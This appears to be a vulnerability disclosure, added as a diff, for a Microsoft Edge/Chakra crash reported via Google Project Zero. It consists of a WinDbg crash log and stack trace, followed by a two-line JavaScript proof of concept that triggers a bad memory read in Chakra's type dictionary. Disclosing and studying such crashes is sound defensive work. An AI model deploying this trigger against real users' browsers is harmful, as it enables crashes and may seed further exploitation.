@@ -1,0 +1,64 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1339
+
+I accidentally found this while trying to reproduce another bug in Edge.
+
+Failed to reproduce on Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393.
+Tested on Microsoft Edge 40.15063.0.0, Microsoft EdgeHTML 15.15063 (Insider Preview).
+
+Crash Log:
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+chakra!JsUtil::WeaklyReferencedKeyDictionary<Js::DynamicType,Js::DynamicType * __ptr64,DefaultComparer<Js::DynamicType const * __ptr64>,1>::FindEntry<Js::DynamicType>+0x41:
+00007fff`e2b7c841 8b0c81          mov     ecx,dword ptr [rcx+rax*4] ds:0000023b`4a2ea4c4=????????
+0:015> k
+ # Child-SP          RetAddr           Call Site
+00 000000be`563fbba0 00007fff`e2f52e3e chakra!JsUtil::WeaklyReferencedKeyDictionary<Js::DynamicType,Js::DynamicType * __ptr64,DefaultComparer<Js::DynamicType const * __ptr64>,1>::FindEntry<Js::DynamicType>+0x41
+01 000000be`563fbbf0 00007fff`e2e1f9a4 chakra!JsUtil::WeaklyReferencedKeyDictionary<Js::DynamicType,Js::DynamicType * __ptr64,DefaultComparer<Js::DynamicType const * __ptr64>,1>::TryGetValue+0x56
+02 000000be`563fbc40 00007fff`e2cb58a9 chakra!Windows::Data::Text::IUnicodeCharactersStatics::`vcall'{144}'+0x58fc4
+03 000000be`563fbcf0 00007fff`e2db04c8 chakra!Js::JavascriptObject::ChangePrototype+0x109
+04 000000be`563fbd30 00007fff`e2dbe863 chakra!Js::JavascriptObject::EntrySetPrototypeOf+0xc8
+05 000000be`563fbd80 00007fff`e2c5dfb8 chakra!amd64_CallFunction+0x93
+06 000000be`563fbde0 00007fff`e2c610da chakra!Js::InterpreterStackFrame::OP_CallCommon<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallIWithICIndex<Js::LayoutSizePolicy<0> > > >+0x158
+07 000000be`563fbe80 00007fff`e2c67c61 chakra!Js::InterpreterStackFrame::OP_ProfiledCallIWithICIndex<Js::OpLayoutT_CallIWithICIndex<Js::LayoutSizePolicy<0> > >+0xaa
+08 000000be`563fbf00 00007fff`e2c6436c chakra!Js::InterpreterStackFrame::ProcessProfiled+0x131
+09 000000be`563fbf60 00007fff`e2dc1bfd chakra!Js::InterpreterStackFrame::Process+0x12c
+0a 000000be`563fbfc0 00007fff`e2d88cd5 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x3bd
+0b 000000be`563fc310 0000023a`3c412fc2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
+0c 000000be`563fc360 00007fff`e2dbe863 0x0000023a`3c412fc2
+0d 000000be`563fc390 00007fff`e2ca6113 chakra!amd64_CallFunction+0x93
+0e 000000be`563fc3e0 00007fff`e2c52060 chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+0f 000000be`563fc440 00007fff`e2c51167 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x100
+10 000000be`563fc530 00007fff`e2d9ec52 chakra!Js::JavascriptFunction::CallRootFunction+0x4b
+11 000000be`563fc5a0 00007fff`e2c50fa4 chakra!ScriptSite::CallRootFunction+0x6a
+12 000000be`563fc600 00007fff`e2d30c99 chakra!ScriptSite::Execute+0x124
+13 000000be`563fc690 00007fff`e2d31fde chakra!ScriptEngine::ExecutePendingScripts+0x1a5
+14 000000be`563fc760 00007fff`e2d32271 chakra!ScriptEngine::ParseScriptTextCore+0x436
+15 000000be`563fc8b0 00007fff`da0fe8d5 chakra!ScriptEngine::ParseScriptText+0xb1
+16 000000be`563fc960 00007fff`da0fe71e edgehtml!CJScript9Holder::ParseScriptText+0x119
+17 000000be`563fca00 00007fff`da0fe237 edgehtml!CScriptCollection::ParseScriptText+0x202
+18 000000be`563fcae0 00007fff`da0fdb67 edgehtml!CScriptData::CommitCode+0x357
+19 000000be`563fcca0 00007fff`da2c50ad edgehtml!CScriptData::Execute+0x20f
+1a 000000be`563fcd50 00007fff`da136ad4 edgehtml!CHtmScriptParseCtx::Execute+0x7d
+1b 000000be`563fcd80 00007fff`da135ba1 edgehtml!CHtmParseBase::Execute+0x204
+1c 000000be`563fce10 00007fff`da2be8cb edgehtml!CHtmPost::Exec+0x1e1
+1d 000000be`563fcff0 00007fff`da2be7af edgehtml!CHtmPost::Run+0x2f
+1e 000000be`563fd020 00007fff`da2be663 edgehtml!PostManExecute+0x63
+1f 000000be`563fd060 00007fff`da2be4fd edgehtml!PostManResume+0xa3
+20 000000be`563fd0a0 00007fff`da2ccfb3 edgehtml!CHtmPost::OnDwnChanCallback+0x3d
+21 000000be`563fd0f0 00007fff`da2a4ddb edgehtml!CDwnChan::OnMethodCall+0x23
+22 000000be`563fd120 00007fff`da163f46 edgehtml!GWndAsyncTask::Run+0x1b
+23 000000be`563fd150 00007fff`da280480 edgehtml!HTML5TaskScheduler::RunReadiedTask+0x236
+24 000000be`563fd220 00007fff`da2802a3 edgehtml!TaskSchedulerBase::RunReadiedTasksInTaskQueueWithCallback+0x70
+25 000000be`563fd270 00007fff`da164af3 edgehtml!HTML5TaskScheduler::RunReadiedTasks+0xa3
+26 000000be`563fd2d0 00007fff`da162fe5 edgehtml!NormalPriorityAtInputEventLoopDriver::DriveRegularPriorityTaskExecution+0x53
+27 000000be`563fd300 00007fff`fb3dbc50 edgehtml!GlobalWndProc+0x125
+
+
+PoC:
+-->
+
+<script>
+Object.setPrototypeOf({}, this);
+location.reload();
+</script>
